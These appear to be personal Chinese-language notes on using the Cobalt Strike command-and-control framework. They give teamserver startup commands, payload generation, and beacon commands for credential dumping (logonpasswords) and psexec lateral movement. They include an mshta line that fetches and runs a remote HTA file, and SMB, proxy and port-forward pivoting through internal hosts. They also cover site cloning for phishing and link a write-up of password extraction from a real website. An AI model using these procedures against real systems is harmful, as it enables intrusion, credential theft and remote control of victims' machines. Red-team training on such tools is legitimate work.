https://mp.weixin.qq.com/s/F1H4ReV71gK7JeoYxV3n5g
https://github.com/k8gege/Aggressor/releases/tag/cs
## 环境介绍
### 启动

```shell
# windows
teamserver.bat 192.168.50.161 123456

# Linux
chomd 777 teamserver
./teamserver 192.168.159.130 pass

-xms 要 <= xmx
# 中文乱码 client
java -Dfile.encoding=utf-8 ...
```

如果报错,设置内存
```bash
java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar
# jdk11 启动
```

### 工具栏

![](https://s2.loli.net/2022/05/18/ot2CiV7mMeKuLq5.jpg)

[hosts / hosts (stager)](https://blog.csdn.net/qq_41874930/article/details/115545366)
可以上线到多个cs 服务器

### 插件安装 

Cobalt strike - 左上角菜单: 脚本管理器 - 选中cna - Load
安装 梼机/OLa

攻击
- Office木马, 生成后监制到docm
- 分阶段木马 - 无法选择中转监听器
- 无阶段木马

Web Drive-by:
- Manage 管理当前Team Server开启的所有web服务
- Clone Site 克隆某网站
- Host File 在Team Server的某端口提供Web以供下载某文件
- Scripted Web Delivery 为payload提供web服务以便于下载和执行
- System Profiler 用来获取系统信息:系统版本, Flash版本,浏览器 版本等

#### Ladon
http://k8gege.org/p/Ladon.html


## Attack使用
```shell
sleep 0
shell ipconfig
logonpasswords # 抓取密码 https://mp.weixin.qq.com/s?__biz=MzIwMDcyNzM0Mw==&mid=2247484470&idx=1&sn=b2f7b56028ddf701a903d981e58e324e
psexec # 链接同上

# 1.exe # 2.hta
mshta http://xx/file.hta
```
### 多种上线方式/内网/代理

[1.SMB bacon](https://cloud.tencent.com/developer/article/2036092) [2](https://forum.butian.net/share/1644) 
2. 中转listenr, 用 tcp Listener, 步骤同1
3. 代理上线
4. 正向tcp
5. pystinger

1.SMB bacon
```shell
1.新建 smb listener
2.上线主机右击: portscan,
3.扫出来的主机 右击 - Jump - psexec64 -选一个账号, - listener:smb
```

3.代理上线
```shell
#1.边缘主机131上代理服务 
proxy.exe http -t tcp -p "0.0.0.0:8080" --daemon
#2.然后端口转发到外网ip88上 
netsh interface portproxy add v4tov4 listenaddress=192.168.111.131 listenport=822 connectaddress=192.168.1.88 connectport=8080
#3.cs端 创建 Listener，配置如下
HTTP HOSTS: 192.168.1.89
HTTP Proxy: http://192.168.111.131:822
# 连接过程  192.168.111.236  → 192.168.111.131:822→ 192.168.1.88:8080→ C2(192.168.1.89)
# 攻击机89, 边缘机双ip:1.88/111.131, 内网111.236
```

4.正向tcp
```
1.beacon生成一个stageless形式的木马：上传到目标机器运行：
2.在中转机器的Beacon里使用 connect [ip address] [port]

99.销毁Beacon 链接, 在父会话或子会话的控制台中使用 unlink [ip address] [session PID] 。以后，你可以从同一主机（或其他主机）重新连接到 TCP Beacon。
```
### 代理服务器

Pivoting->SOCKS Server  # 这时监听的ip是cs服务器ip
### 与MSF联动 

[Interoperability with the Metasploit Framework](https://www.cobaltstrike.com/blog/interoperability-with-the-metasploit-framework/)
### 钓鱼攻击/Clone Site

https://blog.csdn.net/B_2013617/article/details/117079467
https://www.youtube.com/watch?time_continue=2&v=fnCLdPOmZOk&feature=emb_logo
[MSF上线CS_adobe flash](https://www.youtube.com/watch?v=fnCLdPOmZOk&t=2s)
erwerwer
# Learning

## Step1 

EventLog里可以聊天 交流。
/msg `butane text -- 私聊信息
# Article
[全网最全的Cobalt Strike使用教程系列-基础篇](https://mp.weixin.qq.com/s/4KvmV9cdyzPsYHtBlEKGFQ)
[干货|两个超实用的上线Cobaltstrike技巧！](https://mp.weixin.qq.com/s/jGwrVr0iotelS4KivC8pwA)
[全网最全的 Cobalt Strike 使用教程-内网渗透之域控攻击篇](https://mp.weixin.qq.com/s/Nfhwx0JRt5S5LbcsXNMeyg)
[Cobalt Strike Training Resources](https://www.cobaltstrike.com/training/)
[done 1/9 | Cobalt Strike Red Team Ops - Training Cours](https://www.youtube.com/playlist?list=PLcjpg2ik7YT6H5l9Jx-1ooRYpfvznAInJ)

## 使用帮助
[提取密码 | 对湾湾某网站的一次渗透测试](http://mp.weixin.qq.com/s?__biz=MzIwMDcyNzM0Mw==&mid=2247484330&idx=1&sn=fa5f3c3de8737f3ddbc5622917b2c852)

## plugin
[分享个CobaltStrike插件 Bypass防护添加用户（附下载）](https://mp.weixin.qq.com/s/6nu1dwdvdtnP_6C-nIpMVg)
[Cobalt-Strike之CrossC2插件安装与linux上线](https://mp.weixin.qq.com/s/Fty2S9ettdtTFgJWVTvQNQ)
[CobaltStrike加载插件](https://mp.weixin.qq.com/s/NtxhTkuMGhhRyLUREnZQcA)

## Vocabulary

C2: command and control

